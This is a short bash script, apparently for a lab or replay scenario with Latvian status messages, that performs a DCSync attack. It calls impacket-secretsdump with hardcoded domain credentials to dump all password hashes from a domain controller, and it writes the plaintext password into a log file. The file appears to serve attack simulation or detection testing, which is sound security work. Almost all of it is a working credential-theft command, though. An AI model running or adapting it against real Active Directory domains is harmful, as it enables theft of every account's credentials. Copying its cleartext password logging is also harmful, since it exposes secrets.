#!/bin/bash

set -euo pipefail

DOMAIN="LAB"
USERNAME="replication_test"
PASSWORD="P@ssw0rd3!"
DC_IP="10.99.10.10"
SCENARIO_ID="${1:-dcsync}"
LOG_FILE="scenario.log"

START_TIME="$(date -Is)"
echo "${START_TIME},scenario=${SCENARIO_ID},type=dcsync,status=start,domain=${DOMAIN},username=${USERNAME},password=${PASSWORD},dc_ip=${DC_IP}" >> "${LOG_FILE}"

echo "[*] ${START_TIME}: Sākts DCSync scenārijs ${SCENARIO_ID}"
echo "[*] Domēns: ${DOMAIN} Lietotājs: ${USERNAME} Parole: ${PASSWORD} DC: ${DC_IP}"

impacket-secretsdump "${DOMAIN}/${USERNAME}:${PASSWORD}@${DC_IP}" -just-dc

END_TIME="$(date -Is)"
echo "${END_TIME},scenario=${SCENARIO_ID},type=dcsync,status=end,domain=${DOMAIN},username=${USERNAME},password=${PASSWORD},dc_ip=${DC_IP}" >> "${LOG_FILE}"

echo "[*] ${END_TIME}: Pabeigts scenārijs ${SCENARIO_ID}"

